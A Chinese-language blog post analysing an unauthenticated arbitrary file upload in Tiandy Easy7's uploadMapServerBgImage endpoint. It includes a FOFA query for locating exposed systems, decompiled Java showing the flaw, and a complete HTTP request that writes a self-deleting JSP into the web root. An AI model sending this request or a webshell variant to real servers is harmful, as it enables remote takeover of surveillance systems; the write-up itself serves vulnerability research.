---
title: "天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞"
source: https://mrxn.net/jswz/easy7-file-uploadMapServerBgImage-rce.html
asset_dir: assets/天地伟业easy7-uploadmapserverbgimage-文件上传漏洞
---

# 天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/12 08:28
- 259浏览
- [0评论](#comment)
- 33分钟阅读

深入探索

REST

软件

rest

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的[软件](#)系统。

漏洞扫描服务

该系统的/Easy7/rest/file/uploadMapServerBgImage接口存在前台的任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)接口，可构造请求包，上传webshell文件并保存在任意路径，从而控制服务器。漏洞利用难度极低，可在未登录的状态下直接发送恶意请求包造成利用，可能被蠕虫、黑客组织批量利用。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

软件

再来看本次的[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)接口 /Easy7/rest/file/uploadMapServerBgImage 的对应方法`uploadMapServerBgImage()`的实现逻辑

```
@Controller
@RequestMapping({"/file"})
public class CLS_REST_File {
    @Resource(
        name = "boSystemInfo"
    )
    private CLS_BO_SystemInfo boSystemInfo;
    @Resource(
        name = "boFile"
    )
    private CLS_BO_File boFile;
    @Resource(
        name = "boPROXY"
    )
    private CLS_BO_PROXY boPROXY;
    private static final Log log = LogFactory.getLog(CLS_REST_File.class);

    @RequestMapping({"/uploadMapServerBgImage"})
    public void uploadMapServerBgImage(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.getWriter().print("<html><body><textarea>" + JSONObject.fromObject(this.boFile.uploadFiles(request)).toString() + "</textarea></body></html>");
    }
```

深入探索

漏洞扫描器

计算机安全

服务器安全服务

跟进 `this.boFile.uploadFiles`方法

[![天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞](images/img-001-7a2d654ac45a.webp)](https://image.mrxn.net/ccca98777b88473f834e4ff201da19a1.webp)

当上传数据中有`name="uploadParams"`的内容时，从json数组中提取文件的存储路径（`path`）和保存文件名（`name`）。

然后看接下来文件保存位置以及文件名的处理逻辑

计算机科学

```
String uploadPath = null;
if (StringUtils.isNotEmpty(mapServerBgImageItems.getPath())) {
    uploadPath = mapServerBgImageItems.getPath();
}
......
File dir = new File(CLS_Easy7_Types.PROJECT_PATH + uploadPath);
if (!dir.exists()) {
    dir.mkdirs();
}
String savedName = null;
if (mapServerBgImageItems.getName() != null) {
    savedName = mapServerBgImageItems.getName();
}

fileName = fileItem.getName();
```

关键的[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)保存处理操作如下

计算机服务器

```
try {
    fis = fileItem.getInputStream();
    fos = new FileOutputStream(CLS_Easy7_Types.PROJECT_PATH + uploadPath + "/" + savedName);
    byte[] buf = new byte[1024];
    int len = 0;

    while((len = fis.read(buf)) >= 0) {
        fos.write(buf, 0, len);
    }
    continue;
```

其中重点看下`CLS_Easy7_Types.PROJECT_PATH`是如何定义的

```
ROJECT_PATH = CLS_Easy7_Types.class.getResource("/").getPath() + "../../";
```

> 在标准的 Tomcat 部署结构中，一个 Web 应用的类文件通常存放在 webapps/应用名/WEB-INF/classes/ 目录下。当你调用 CLS\_Easy7\_Types.class.getResource("/") 时，Java 返回的是当前 ClassLoader 加载资源的根路径，也就是这个 classes 目录的绝对路径。
>
> 黑客与破解
>
> 接着看后面的路径回溯操作。第一个 ../ 会让你从 classes 目录退回到 WEB-INF 目录；第二个 ../ 则会让你从 WEB-INF 进一步退回到 应用名 这一层，也就是我们常说的 WebRoot（Web 应用根目录）。
>
> 所以，PROJECT\_PATH 最终指向的就是你的 Web 应用在服务器上的物理根目录。

因此我们只需要在`uploadParams`的json数组里指定path的值为当前目录`/`即可，name为希望保存的文件名，即可将任意文件上传到当前应用根目录，从而造成任意文件上传漏洞，根本不需要网上的POC还目录穿越到不同形式的目录即可完成[RCE](https://mrxn.net/tag/rce)。

# 漏洞复现

```
POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1
Host: easy7.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadParams"

[{"path": "/", "name": "x.jsp"}]
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.png"
Content-Type: image/png

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

访问 `/Easy7/x.jsp` 成功执行代码并删除自身

漏洞扫描服务

[![天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞](images/img-002-8bb83f896852.webp)](https://image.mrxn.net/6f84ca6b882d4d91af197786c7dd7554.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
